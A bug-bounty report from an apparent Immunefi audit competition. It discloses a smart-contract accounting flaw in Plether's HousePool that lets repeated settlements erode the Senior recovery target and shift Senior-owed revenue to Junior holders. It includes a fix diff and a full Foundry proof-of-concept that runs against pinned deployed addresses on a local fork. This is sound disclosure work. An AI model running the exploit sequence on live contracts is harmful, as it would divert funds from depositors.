# \#99285 [SC-High] Double reservation of a queued recapitalization in `HousePool._settleablePendingClaimantBuckets()` lets any LP-epoch settler erode the Senior recovery target and hand Senior-owed revenue to Junior

**Submitted on Nov 12th 2026 at 21:33:33 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99285
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

`HousePool._settleablePendingClaimantBuckets()` caps a queued recapitalization by the pool's gross distributable value, which already contains the Senior principal that the previous settlement created from the same recapitalization. After an owner recapitalization that only partly covers a terminal deficit, every later permissionless LP-epoch settlement re-reserves the queued residual against that principal, absorbs it as a loss, re-bootstraps Senior from the slice and lowers the Senior high-water mark, until the recovery target equals the cash slice instead of the recapitalization amount. The next LP revenue is then credited to Junior holders instead of restoring Senior: Theft of unclaimed yield from the Senior cohort.

This finding was identified and documented collaboratively by georgibuilds and EagleEye.



## Vulnerability Details

`_reconcile()` (HousePool.sol#L1555) caps the pending buckets at HousePool.sol#L1565-L1566 through `_settleablePendingClaimantBuckets()`, which passes `reconcileSnapshot.distributable` unchanged to `capClaimantBuckets()` (HousePool.sol#L1833). `planReconcile()` subtracts that slice from distributable before comparing with the stored principals (HousePoolReconcilePlanLib.sol#L68-L71). The slice is then routed by `_applyPendingClaimantBucketsLive()` (HousePool.sol#L1598, #L1759).

When a recapitalization `A` is queued while the terminal deficit is `d` with `d < A <= 2d`, the first settlement after it has distributable `A - d`, routes that slice to Senior (bootstrap branch, HousePoolPendingPreviewLib.sol#L118-L121: `S = A - d`, `HWM = A`) and keeps `d` queued. Distributable is still `A - d` at the next settlement, and it is now Senior principal. The cap ignores that: the next pass takes a slice of `A - d` again, `planReconcile()` sees zero distributable for claims, `absorbLoss()` zeroes Senior (HousePoolWaterfallAccountingLib.sol#L167-L184), and the bootstrap branch re-seeds `S = A - d` with `HWM = max(remaining queue, slice)`, one slice lower. No loss happened; the owner's cash is re-reserved against the principal it already created. The queue drains while the high-water mark steps down to `A - d`. The Cecuro MED-12 fix note says partial-settlement residuals stay reserved; it does not reserve them against the equity they created.

Each settlement is the permissionless `OrderRouter.settleLpEpoch()` -> `HousePool.settleLpEpoch()` (HousePool.sol#L797) with one matured LP request; a zero-quote Junior exit is refunded and counts as progress. The recapitalization is the owner's documented `CfdEngine.recapitalizePool()` (CfdEngine.sol#L632-L655).

1. A new Senior LP requests a 38,500,000 USDG deposit and seven Junior LPs 10,000 USDG each; the next LP epoch activates them. Senior HWM equals principal.
2. The USD strengthens 1% against the basket; a mark refresh installs it, so the fork's open traders are in profit. The first Junior LP requests an exit.
3. Loss event at the next epoch: the pool loses USDG equal to all LP equity at the mark plus 300,000 USDG.
4. The next LP settlement absorbs it: Senior = Junior = 0, HWM kept; the pool records a 300,000 USDG terminal deficit.
5. The owner recapitalizes 450,000 USDG (1.5 x the reported deficit). The second Junior LP requests an exit.
6. The next LP settlement routes the settleable 150,000 to Senior and sets HWM = 450,000; 300,000 stays queued.
7. Two more ordinary settlements, each processing one Junior exit, with no loss and no price change: the queue drains to 0 while Senior stays at 150,000 and HWM falls to 300,000, then 150,000.
8. The 1% move reverses. The on-chain pricing projection credits the LP revenue to Junior; Senior, already at its lowered HWM, gets none.

## Impact Details

**Selected impact:** Theft of unclaimed yield

Before the drain: Senior principal 150,000.00 USDG, HWM 450,000.00 USDG, 300,000.00 USDG of the owner's recapitalization queued. After two permissionless settlements with no loss: Senior principal 150,000.00, HWM 150,000.00, queue 0. The Senior recovery target set by the recapitalization fell by 300,000.00 USDG. When the move reverses, the projected LP revenue of 360,133.25 USDG goes to Junior holders (projected Junior 360,133.25, Senior unchanged at 150,000.00); at the recapitalization baseline Senior would have taken 300,000.00 of it first. No in-protocol writer raises the HWM again without new Senior deposits.

## Recommendation

Cap the settleable bucket by the distributable value that is not already claimed, so a routed slice is never re-reserved against itself. The queued residual then waits for new value, as documented, and the high-water mark keeps the recapitalization amount.

```diff
diff --git a/packages/perps/src/HousePool.sol b/packages/perps/src/HousePool.sol
index fceb093d..10361243 100644
--- a/packages/perps/src/HousePool.sol
+++ b/packages/perps/src/HousePool.sol
@@ -1829,8 +1829,14 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
     function _settleablePendingClaimantBuckets(
         HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
         HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
-    ) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
-        return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
+    ) internal view returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
+        // Cap by the terminal value not yet claimed. Equity already booked as Senior, Junior or unassigned principal
+        // is part of `distributable`; routing a bucket against it would reserve the same value twice and absorb the
+        // already-routed part as a loss on the next pass.
+        uint256 claimedAssets = seniorPrincipal + juniorPrincipal + unassignedAssets;
+        uint256 unclaimedDistributable =
+            reconcileSnapshot.distributable > claimedAssets ? reconcileSnapshot.distributable - claimedAssets : 0;
+        return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, unclaimedDistributable);
     }
 
     function _getHousePoolInputSnapshot()
```


## Proof of Concept

## Proof of Concept## Proof of Concept

- Env var: `ARB_SEPOLIA_RPC_URL` = an archive RPC URL of Arbitrum Sepolia; read-only, the test runs on a local fork
- Fork block: 326368388 (chain id 421614), Plether Perps v2.0.0 (USDG) deployment, Pyth replaced by the repo's `MockPyth` (out of scope)
- Forge: forge Version: 1.8.7
- Command, from `packages/perps`: `ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F052_RecapResidualReReservedAgainstSenior.t.sol --match-test test_F052_poc -vvv`
- File: `test/F052_RecapResidualReReservedAgainstSenior.t.sol` (control: `test_F052_control`, a 900,000 USDG recapitalization, 3 x the deficit, keeps the HWM)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// F-052 Recap residual re-reserved against the Senior principal it created in HousePool._settleablePendingClaimantBuckets()
// Local fork of Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG). Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run: ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F052_RecapResidualReReservedAgainstSenior.t.sol --match-test test_F052_poc -vvv
//   or against a local Anvil fork: anvil --fork-url <archive rpc url> --fork-block-number <FORK_BLOCK> &
//                                  ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F052_RecapResidualReReservedAgainstSenior.t.sol ...
// LOCAL FORK ONLY (Immunefi PoC rules): the RPC is read-only. Never vm.broadcast, cast send or --broadcast:
// a transaction on mainnet or a public testnet means an immediate, permanent Immunefi ban.

import {Test, console} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ICfdEngineProtocolLens} from "@plether/perps/interfaces/ICfdEngineProtocolLens.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public HousePool getters used by the PoC.
interface IHousePoolF052 {
    function seniorPrincipal() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function seniorHighWaterMark() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function pendingRecapitalizationAssets() external view returns (uint256);
    function pendingTradingRevenueAssets() external view returns (uint256);
    function terminalDeficitAssets() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function owner() external view returns (address);
    function seniorVault() external view returns (address);
    function juniorVault() external view returns (address);
    function ENGINE_PROTOCOL_LENS() external view returns (address);
    function getSeniorDepositCapacity() external view returns (uint256);
    function markStalenessLimit() external view returns (uint256);
    function lpEpochStart(uint256 epochId) external view returns (uint256);
    function canAcceptTrancheDeposits(bool isSenior) external view returns (bool);
    function getPendingTrancheState()
        external
        view
        returns (uint256 seniorPrincipalAssets, uint256 juniorPrincipalAssets, uint256 maxSeniorWithdraw, uint256 maxJuniorWithdraw);
}

interface IEngineF052 {
    function owner() external view returns (address);
    function degradedMode() external view returns (bool);
    function totalTraderClaimBalanceAssets() external view returns (uint256);
    function recapitalizePool(uint256 amountAssets) external;
}

interface IRouterF052 {
    function pletherOracle() external view returns (address);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
}

interface ITrancheVaultF052 {
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function depositQueueHead() external view returns (uint256);
    function redeemQueueHead() external view returns (uint256);
}

interface IOracleF052 {
    function pyth() external view returns (address);
    function isOracleFrozen() external view returns (bool);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
    function housePool() external view returns (address);
}

interface IPythFeeF052 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IArbSysBlockF052 {
    function arbBlockNumber() external view returns (uint256);
}

contract F052_RecapResidualReReservedAgainstSenior is Test {
    // Pinned Arbitrum Sepolia block (2026-11-05 17:42:16 UTC, a Thursday: FX market open), after deployment block 323658447.
    uint256 internal constant FORK_BLOCK = 326368388;

    // Deployed v2.0.0 addresses (addresses.env). Deployed from 1209ca8a; packages/perps/src is identical at scope a82d4fef.
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B; // PERPS_OWNER (engine + pool owner)
    // Pyth contract the deployed oracle reads (out of scope; replaced below by the repo's own MockPyth).
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    // A new Senior LP within the release Senior cap (40M USDG, scope page) and the live capacity (checked in setUp).
    uint256 internal constant SENIOR_DEPOSIT = 38_500_000e6;
    // Ordinary Junior LPs; their exit requests are the matured LP work each permissionless settlement processes.
    uint256 internal constant JUNIOR_DEPOSIT = 10_000e6;
    // Terminal deficit left by the loss event (USDG the pool owes beyond all LP equity at the mark).
    uint256 internal constant DEFICIT = 300_000e6;
    // Upper bound on the settlement passes run after the recap pass.
    uint256 internal constant MAX_PASSES = 4;
    // Basket moves (bps of the real stored price at FORK_BLOCK): USD +1% (traders in profit), back to the stored price.
    uint256 internal constant USD_UP = 9_900;
    uint256 internal constant BASE = 10_000;

    IHousePoolF052 internal pool = IHousePoolF052(POOL);
    IEngineF052 internal engine = IEngineF052(ENGINE);
    IRouterF052 internal router = IRouterF052(ROUTER);
    ITrancheVaultF052 internal senior = ITrancheVaultF052(SENIOR_VAULT);
    ITrancheVaultF052 internal junior = ITrancheVaultF052(JUNIOR_VAULT);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal sam = makeAddr("sam"); // new Senior LP (38.5M): the victim cohort
    address internal ned = makeAddr("ned"); // Junior LP who keeps his shares through the loss
    address internal keeper = makeAddr("keeper"); // any LP-epoch settler (permissionless Router path)
    address internal refresher = makeAddr("refresher"); // any mark refresher (e.g. the oracle worker)
    // Junior LPs whose exit requests are the LP work of the wipe pass, the recap pass and each later pass.
    address[] internal exiters;
    uint256 internal nextExiter;

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Height = FORK_BLOCK;

    struct Run {
        uint256 hwmBeforeLoss;
        uint256 lpEquityAtLoss;
        uint256 lossAssets;
        uint256 seniorAfterLoss;
        uint256 juniorAfterLoss;
        uint256 hwmAfterLoss;
        uint256 deficit;
        uint256 recap;
        uint256 seniorAfterPass1;
        uint256 hwmAfterPass1;
        uint256 residualAfterPass1;
        uint256 passes;
        uint256 seniorAfterDrain;
        uint256 hwmAfterDrain;
        uint256 residualAfterDrain;
        uint256 juniorAfterDrain;
        uint256 revenue;
        uint256 seniorProjected;
        uint256 juniorProjected;
        uint256 seniorAtBaseline;
        uint256 nedShares;
        uint256 nedValue;
    }

    // virtual: the never-submitted fix-check test (F052_FixCheck.t.sol, made by poc_patch.py) extends this setUp.
    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        // Drift guard: the live deployment state this PoC relies on.
        assertEq(router.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(IOracleF052(ORACLE).housePool(), POOL, "oracle pool drifted");
        assertEq(IOracleF052(ORACLE).pyth(), PYTH, "oracle Pyth drifted");
        assertEq(pool.seniorVault(), SENIOR_VAULT, "senior vault drifted");
        assertEq(pool.juniorVault(), JUNIOR_VAULT, "junior vault drifted");
        assertEq(pool.owner(), OWNER, "pool owner drifted");
        assertEq(engine.owner(), OWNER, "engine owner drifted");
        assertFalse(IOracleF052(ORACLE).isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertFalse(engine.degradedMode(), "engine not degraded at the fork");
        assertGt(pool.seniorPrincipal(), 0, "live Senior principal");
        assertGt(pool.juniorPrincipal(), 0, "live Junior principal");
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior not impaired at the fork");
        assertEq(pool.unassignedAssets(), 0, "no unassigned assets at the fork");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "no queued recap at the fork");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no queued revenue at the fork");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no recorded trader claims at the fork");
        assertEq(senior.depositQueueHead() + senior.redeemQueueHead(), 0, "senior LP queues empty");
        assertEq(junior.depositQueueHead() + junior.redeemQueueHead(), 0, "junior LP queues empty");
        assertGt(junior.totalSupply(), 0, "Junior shares exist");
        assertGe(pool.getSeniorDepositCapacity(), SENIOR_DEPOSIT, "Senior capacity for the new LP");
        assertEq(pool.markStalenessLimit(), 60, "pool mark staleness drifted");
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleF052(ORACLE).pythFeedIds(i));
            inverted.push(IOracleF052(ORACLE).inversions(i));
        }
        // Every in-scope contract runs as DEPLOYED at FORK_BLOCK; the PoC never replaces or edits in-scope code.

        // Pyth is out of scope: replace its code with the repo's MockPyth. Storage starts from the REAL stored prices
        // at FORK_BLOCK. The real deployment quotes a zero update fee; keep it.
        pythFee = IPythFeeF052(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots only
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
        }
        vm.deal(keeper, 1 ether);
        vm.deal(refresher, 1 ether);

        exiters.push(makeAddr("jill"));
        exiters.push(makeAddr("joe"));
        exiters.push(makeAddr("kim"));
        exiters.push(makeAddr("lee"));
        exiters.push(makeAddr("max"));
        exiters.push(makeAddr("mia"));
    }

    /// The claim, against live state at FORK_BLOCK. Must FAIL once the mitigation is applied.
    /// Owner recap = 1.5 x the reported terminal deficit (any amount in (deficit, 2 x deficit] takes this path).
    function test_F052_poc() public {
        Run memory r = _scenario(3, 2);

        // The recap pass set the Senior recovery target to the recap amount (the documented recap baseline).
        assertEq(r.hwmAfterPass1, r.recap, "recap pass set HWM = recap amount");
        assertGt(r.residualAfterPass1, 0, "part of the recap stayed queued after the recap pass");

        // ---- damage: later settlements, with no loss event, lowered that target while draining the residual.
        int256 eroded = int256(r.hwmAfterPass1) - int256(r.hwmAfterDrain);
        assertGt(eroded, 0, "Senior HWM eroded below the recap baseline by settlement passes with no loss"); // DAMAGE

        assertEq(r.residualAfterDrain, 0, "queued recap fully drained");
        assertGe(r.seniorAfterDrain, r.seniorAfterPass1, "no Senior loss between the passes (carry only)");
        assertEq(r.juniorAfterDrain, 0, "Junior principal stayed zero through the passes");
        assertLt(r.hwmAfterDrain, r.recap, "Senior recovery target now below the recap amount");

        // Consequence: the next LP revenue (the move reverses) is credited to Junior holders instead of restoring
        // Senior toward the recap amount. Projection is the on-chain pricing the vaults use.
        assertGt(r.revenue, 0, "LP revenue projected after the reversal");
        assertLt(r.seniorProjected, r.seniorAtBaseline, "Senior receives less than the recap baseline allows");
        assertGt(r.juniorProjected, 0, "Senior-owed revenue projected to Junior");
        assertGt(r.nedValue, 0, "wiped Junior holder's shares price in the Senior-owed revenue");

        _log(r);
        console.log("Senior HWM erosion (HWM after recap pass - HWM after drain)", uint256(eroded));
        console.log("Senior-owed revenue projected to Junior (baseline Senior - projected Senior)", r.seniorAtBaseline - r.seniorProjected);
    }

    /// Control: the same flow with a recap of 3 x the deficit (above 2 x). Must PASS with and without the fix.
    function test_F052_control() public {
        Run memory twin = _scenario(3, 1);
        assertEq(twin.hwmAfterPass1, twin.recap, "control: recap pass set HWM = recap amount");
        assertEq(twin.hwmAfterDrain, twin.recap, "control: later passes kept the HWM");
        assertGe(twin.seniorAfterDrain, twin.recap - twin.deficit, "control: Senior principal = recap - deficit (+carry)");
        assertEq(twin.juniorAfterDrain, 0, "control: Junior principal stayed zero");
        _log(twin);
    }

    // ------------------------------------------------------------------ shared steps

    /// @dev recap = deficit * num / den, sized from the terminal deficit the pool reports after the loss.
    ///      HousePool.settleLpEpoch() reverts without matured LP work, so every settlement processes an ordinary
    ///      Junior exit request queued in the previous epoch (a zero-quote exit at J == 0 is refunded and counted).
    function _scenario(uint256 num, uint256 den) internal returns (Run memory r) {
        // Step 1: a new Senior LP requests a 38.5M USDG deposit, seven Junior LPs 10k each; the next LP epoch
        //         settles them (permissionless keeper). Senior is not impaired: HWM == principal.
        uint256 requestEpoch = _requestDeposit(senior, sam, SENIOR_DEPOSIT);
        for (uint256 i; i < exiters.length; ++i) {
            _requestDeposit(junior, exiters[i], JUNIOR_DEPOSIT);
        }
        _requestDeposit(junior, ned, JUNIOR_DEPOSIT);
        uint64 t = uint64(pool.lpEpochStart(requestEpoch)) + 30;
        _advance(t);
        _settle(t, BASE);
        vm.prank(sam);
        senior.deposit(SENIOR_DEPOSIT, sam);
        for (uint256 i; i < exiters.length; ++i) {
            vm.prank(exiters[i]);
            junior.deposit(JUNIOR_DEPOSIT, exiters[i]);
        }
        vm.prank(ned);
        r.nedShares = junior.deposit(JUNIOR_DEPOSIT, ned);
        assertEq(pool.seniorHighWaterMark(), pool.seniorPrincipal(), "Senior not impaired before the loss");

        // Step 2: one epoch later the USD strengthens 1% against the basket; a mark refresh installs it, so the
        //         fork's open traders are in profit. The first Junior LP asks to exit.
        t = uint64(pool.lpEpochStart(requestEpoch + 1)) + 40;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, USD_UP));
        uint256 workEpoch = _requestNextExit();

        // Step 3: loss event at the next epoch, modelled as USDG leaving the pool (USDG is out of scope and mockable;
        //         HousePool.totalAssets() counts the raw shortfall): all LP equity at the mark plus DEFICIT.
        t = uint64(pool.lpEpochStart(workEpoch)) + 30;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, USD_UP));
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory s = ICfdEngineProtocolLens(pool.ENGINE_PROTOCOL_LENS())
            .getHousePoolInputSnapshot(pool.markStalenessLimit());
        assertLt(s.terminalLpPriceDeltaAssets, 0, "traders in profit at the loss");
        r.lpEquityAtLoss =
            uint256(int256(s.physicalAssets) + s.terminalLpPriceDeltaAssets - int256(s.traderClaimBalanceAssets));
        r.hwmBeforeLoss = pool.seniorHighWaterMark();
        r.lossAssets = r.lpEquityAtLoss + DEFICIT;
        assertGe(IERC20(USDG).balanceOf(POOL), r.lossAssets, "pool holds the trader profit that backs the deficit");
        deal(USDG, POOL, IERC20(USDG).balanceOf(POOL) - r.lossAssets);

        // Step 4: the next LP settlement (permissionless, processes the first exit) absorbs the loss: Junior, then
        //         Senior, both to zero. absorbLoss keeps the Senior HWM; the pool records the terminal deficit.
        t += 1;
        _advance(t);
        _settle(t, USD_UP);
        r.seniorAfterLoss = pool.seniorPrincipal();
        r.juniorAfterLoss = pool.juniorPrincipal();
        r.hwmAfterLoss = pool.seniorHighWaterMark();
        r.deficit = pool.terminalDeficitAssets();
        assertEq(r.juniorAfterLoss, 0, "loss wiped Junior principal");
        assertEq(r.seniorAfterLoss, 0, "loss wiped Senior principal");
        assertGe(r.hwmAfterLoss, r.hwmBeforeLoss, "loss kept the Senior HWM");
        assertGt(r.deficit, 0, "terminal deficit recorded");

        // Step 5: the owner recapitalizes (documented CfdEngine.recapitalizePool) with num/den x the reported deficit.
        //         The next Junior LP asks to exit.
        t += 1;
        _advance(t);
        r.recap = r.deficit * num / den;
        deal(USDG, OWNER, r.recap);
        vm.startPrank(OWNER);
        IERC20(USDG).approve(ENGINE, r.recap);
        engine.recapitalizePool(r.recap);
        vm.stopPrank();
        assertEq(pool.pendingRecapitalizationAssets(), r.recap, "recap queued");
        workEpoch = _requestNextExit();

        // Step 6: the recap pass: the next LP settlement routes the settleable part (recap - deficit) to Senior and
        //         sets HWM = recap amount; the rest stays queued (HousePool.sol:1833, capClaimantBuckets).
        t = uint64(pool.lpEpochStart(workEpoch)) + 30;
        _advance(t);
        _settle(t, USD_UP);
        r.seniorAfterPass1 = pool.seniorPrincipal();
        r.hwmAfterPass1 = pool.seniorHighWaterMark();
        r.residualAfterPass1 = pool.pendingRecapitalizationAssets();
        console.log("recap pass: Senior / HWM / queued recap", r.seniorAfterPass1, r.hwmAfterPass1, r.residualAfterPass1);

        // Step 7: ordinary LP settlements, one per epoch, each processing the next Junior exit. No loss event, no
        //         price change. Each pass re-reserves the queued residual against the Senior principal the recap pass
        //         created, absorbs it as a loss, re-bootstraps Senior from the slice and lowers the HWM.
        for (uint256 p = 1; p <= MAX_PASSES && pool.pendingRecapitalizationAssets() > 0; ++p) {
            workEpoch = _requestNextExit();
            t = uint64(pool.lpEpochStart(workEpoch)) + 30;
            _advance(t);
            _settle(t, USD_UP);
            r.passes = p;
            console.log(
                "later pass: Senior / HWM / queued recap",
                pool.seniorPrincipal(),
                pool.seniorHighWaterMark(),
                pool.pendingRecapitalizationAssets()
            );
        }
        r.seniorAfterDrain = pool.seniorPrincipal();
        r.hwmAfterDrain = pool.seniorHighWaterMark();
        r.residualAfterDrain = pool.pendingRecapitalizationAssets();
        r.juniorAfterDrain = pool.juniorPrincipal();

        // Step 8: the 1% move reverses; a mark refresh installs it, so the traders give back their profit (LP
        //         revenue). The on-chain projection (HousePool.getPendingTrancheState, the vaults' pricing) routes it
        //         to Senior only up to the lowered HWM; the rest is Junior's.
        t += 60;
        _advance(t);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(t, BASE));
        (r.seniorProjected, r.juniorProjected,,) = pool.getPendingTrancheState();
        r.revenue = (r.seniorProjected + r.juniorProjected) - (r.seniorAfterDrain + r.juniorAfterDrain);
        r.seniorAtBaseline = r.seniorAfterDrain + r.revenue;
        if (r.seniorAtBaseline > r.recap) r.seniorAtBaseline = r.recap;
        r.nedValue = junior.convertToAssets(r.nedShares);
    }

    function _requestDeposit(ITrancheVaultF052 vault, address lp, uint256 assets) internal returns (uint256 epoch) {
        deal(USDG, lp, assets);
        vm.startPrank(lp);
        IERC20(USDG).approve(address(vault), assets);
        epoch = vault.requestDeposit(assets, lp);
        vm.stopPrank();
    }

    function _requestNextExit() internal returns (uint256 epoch) {
        address lp = exiters[nextExiter++];
        uint256 shares = junior.balanceOf(lp);
        vm.prank(lp);
        epoch = junior.requestRedeem(shares, lp, lp);
    }

    // ------------------------------------------------------------------ helpers

    function _log(Run memory r) internal pure {
        console.log("Senior HWM before the loss", r.hwmBeforeLoss);
        console.log("LP equity at the mark before the loss", r.lpEquityAtLoss);
        console.log("loss (USDG leaving the pool)", r.lossAssets);
        console.log("after loss: Senior / Junior / HWM", r.seniorAfterLoss, r.juniorAfterLoss, r.hwmAfterLoss);
        console.log("terminal deficit reported by the pool", r.deficit);
        console.log("owner recap", r.recap);
        console.log("after recap pass: Senior / HWM / queued recap", r.seniorAfterPass1, r.hwmAfterPass1, r.residualAfterPass1);
        console.log("later settlement passes run", r.passes);
        console.log("after drain: Senior / HWM / queued recap", r.seniorAfterDrain, r.hwmAfterDrain, r.residualAfterDrain);
        console.log("after drain: Junior", r.juniorAfterDrain);
        console.log("LP revenue projected after the reversal", r.revenue);
        console.log("projected Senior / Junior after the revenue", r.seniorProjected, r.juniorProjected);
        console.log("Senior at the recap baseline (min(Senior + revenue, recap))", r.seniorAtBaseline);
        console.log("ned's Junior shares / their projected value", r.nedShares, r.nedValue);
    }

    function _settle(uint64 tick, uint256 basketBps) internal {
        vm.prank(keeper);
        router.settleLpEpoch{value: pythFee}(_payload(tick, basketBps));
    }

    /// @dev Moves time and the L2 block. On an Arbitrum fork `block.number` is the L1 block, and forge serves the
    ///      ArbSys precompile (0x64, out of scope) as the fork's L2 block without following vm.roll. On chain
    ///      arbBlockNumber() advances every L2 block, so the PoC sets it to the rolled L2 height.
    function _advance(uint64 timestamp) internal {
        l2Height += 4 * (timestamp - vm.getBlockTimestamp()) + 1; // Arbitrum produces ~4 L2 blocks per second
        vm.warp(timestamp);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF052.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    /// @dev Signed-update stand-in for a live tick at `tick`: the real stored price of each feed at FORK_BLOCK with the
    ///      basket scaled by `basketBps`/10_000: USD-quoted feeds x f, inverted (USD/xxx) feeds x 1/f.
    function _payload(uint64 tick, uint256 basketBps) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            int64 price = p.price;
            if (basketBps != BASE) {
                price = inverted[i]
                    ? int64(int256(price) * int256(BASE) / int256(basketBps))
                    : int64(int256(price) * int256(basketBps) / int256(BASE));
            }
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: price, conf: p.conf, expo: p.expo, publishTime: tick, prevPublishTime: tick - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```

